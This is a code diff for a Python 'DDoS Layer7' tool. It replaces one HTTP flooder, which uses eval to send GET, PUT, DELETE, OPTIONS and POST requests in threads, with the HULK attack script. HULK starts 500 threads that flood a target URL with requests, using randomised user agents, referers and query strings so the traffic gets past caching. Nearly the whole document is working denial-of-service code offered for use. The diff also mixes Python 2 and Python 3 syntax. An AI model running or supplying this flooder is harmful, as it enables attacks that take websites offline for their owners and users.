@@ -23,104 +23,149 @@ print("""\033[93m
                DDoS Layer7 (DDoS) 💥
 """)
 print()
-os.system("clear")
-import os
-import requests
-from tqdm import tqdm
-from sys import version
-from threading import Thread
-from colorama import init, Fore, Back, Style
+import urllib2
+import sys
+import threading
+import random
+import re
 
-version = "5"
+#global params
+url=''
+host=''
+headers_useragents=[]
+headers_referers=[]
+request_counter=0
+flag=0
+safe=0
 
-loop = tqdm(total = 1000, position=0, leave=False)
-for k in range(1000):
-    loop.set_description(f'{Fore.RED}[IV]{Fore.RESET} Loading.....'.format(k))
-    loop.update(1)
-loop.close()    
-os.system('cls') 
+def inc_counter():
+	global request_counter
+	request_counter+=1
 
-def menu():
-    print(f'''     
-{Fore.LIGHTRED_EX} ██╗██╗░░░██╗
-{Fore.LIGHTRED_EX} ██║██║░░░██║ 
-{Fore.LIGHTRED_EX} ██║╚██╗░██╔╝ 
-{Fore.LIGHTRED_EX} ██║░╚████╔╝░
-{Fore.LIGHTRED_EX} ██║░░╚██╔╝░░
-{Fore.LIGHTRED_EX} ╚═╝░░░╚═╝░░░
-            
-              {Fore.RED}╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
-              {Fore.RED}│  	IV  : {version}  │
-              {Fore.RED}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
-    {Fore.RESET} ''')
+def set_flag(val):
+	global flag
+	flag=val
 
-menu()
+def set_safe():
+	global safe
+	safe=1
+	
+# generates a user agent array
+def useragent_list():
+	global headers_useragents
+	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
+	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
+	return(headers_useragents)
 
-def menu2(): 
-    print(f'''    
-{Fore.LIGHTRED_EX} ██╗██╗░░░██╗
-{Fore.LIGHTRED_EX} ██║██║░░░██║ 
-{Fore.LIGHTRED_EX} ██║╚██╗░██╔╝ 
-{Fore.LIGHTRED_EX} ██║░╚████╔╝░
-{Fore.LIGHTRED_EX} ██║░░╚██╔╝░░
-{Fore.LIGHTRED_EX} ╚═╝░░░╚═╝░░░
-                                                Version : {version}
-                                    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
-                                      ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    {Fore.RESET} ''')
+# generates a referer array
+def referer_list():
+	global headers_referers
+	headers_referers.append('http://www.google.com/?q=')
+	headers_referers.append('http://www.usatoday.com/search/results?q=')
+	headers_referers.append('http://engadget.search.aol.com/search?q=')
+	headers_referers.append('http://' + host + '/')
+	return(headers_referers)
+	
+#builds random ascii string
+def buildblock(size):
+	out_str = ''
+	for i in range(0, size):
+		a = random.randint(65, 90)
+		out_str += chr(a)
+	return(out_str)
 
-global url, time, file
-url     =     input(f'{Fore.LIGHTGREEN_EX}╰─────| ССЫЛКА URL |───> {Fore.BLUE}')
-print(f'')
-time    = int(input(f'{Fore.LIGHTGREEN_EX}╰─────| ВРЕМЯ TIMEING |───> {Fore.BLUE} '))
-print(f'')
-threads = int(input(f'{Fore.LIGHTGREEN_EX}╰─────| ПОТОКИ [800] THREAD |───> {Fore.BLUE}'))
-print('')
+def usage():
+	print '---------------------------------------------------'
+	print 'USAGE: python hulk.py <url>'
+	print 'you can add "safe" after url, to autoshut after dos'
+	print '---------------------------------------------------'
 
-loop = tqdm(total = 1000, position=0, leave=False)
-for k in range(1000):
-    loop.set_description(f'{Fore.RED}[IV]{Fore.RESET} Waiting To Run SOURCE ........'.format(k))
-    loop.update(1)
-loop.close()    
-os.system('cls') 
-
-menu2()
-
-global breakFlag
-breakFlag = False
-
-print(f'{Fore.RED} Sending Packet to : {Fore.GREEN}{url}')
-
-def attack(request):
-	global url, time, file
-	i = 0
-	while True:
-		try:
-			req = eval("requests."+request+"('"+url+"')")
-			print(f'{Fore.RED} Atack To {Fore.BLUE}{url} {Fore.RED}Thread : {Fore.GREEN}{threads}')
-		except:
-			print(f'{Fore.RED} Atack Has Ben Errored')
-		i+=1
-		if time != 0:
-			if i>time:
-				break
-
-def createThreadings():
-	global breakFlag
+	
+#http request
+def httpcall(url):
+	useragent_list()
+	referer_list()
+	code=0
+	if url.count("?")>0:
+		param_joiner="&"
+	else:
+		param_joiner="?"
+	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+	request.add_header('User-Agent', random.choice(headers_useragents))
+	request.add_header('Cache-Control', 'no-cache')
+	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
+	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
+	request.add_header('Keep-Alive', random.randint(110,120))
+	request.add_header('Connection', 'keep-alive')
+	request.add_header('Host',host)
 	try:
-		Thread(target=lambda: attack("get")).start()
-		Thread(target=lambda: attack("put")).start()
-		Thread(target=lambda: attack("delete")).start()
-		Thread(target=lambda: attack("options")).start()
-		Thread(target=lambda: attack("post")).start()
-	except:
-		breakFlag = True
+			urllib2.urlopen(request)
+	except urllib2.HTTPError, e:
+			#print e.code
+			set_flag(1)
+			print 'Response Code 500'
+			code=500
+	except urllib2.URLError, e:
+			#print e.reason
+			sys.exit()
+	else:
+			inc_counter()
+			urllib2.urlopen(request)
+	return(code)		
 
-if(threads != 0):
-	for i in range(threads):
-		createThreadings()
+	
+#http caller thread 
+class HTTPThread(threading.Thread):
+	def run(self):
+		try:
+			while flag<2:
+				code=httpcall(url)
+				if (code==500) & (safe==1):
+					set_flag(2)
+		except Exception, ex:
+			pass
+
+# monitors http threads and counts requests
+class MonitorThread(threading.Thread):
+	def run(self):
+		previous=request_counter
+		while flag==0:
+			if (previous+100<request_counter) & (previous<>request_counter):
+				print "%d Requests Sent" % (request_counter)
+				previous=request_counter
+		if flag==2:
+			print "\n-- HULK Attack Finished --"
+
+#execute 
+if len(sys.argv) < 2:
+	usage()
+	sys.exit()
 else:
-	while True:
-		createThreadings()
-		if(breakFlag):
-			break
+	if sys.argv[1]=="help":
+		usage()
+		sys.exit()
+	else:
+		print "-- HULK Attack Started --"
+		if len(sys.argv)== 3:
+			if sys.argv[2]=="safe":
+				set_safe()
+		url = sys.argv[1]
+		if url.count("/")==2:
+			url = url + "/"
+		m = re.search('(https?\://)?([^/]*)/?.*', url)
+		host = m.group(2)
+		for i in range(500):
+			t = HTTPThread()
+			t.start()
+		t = MonitorThread()
+		t.start()
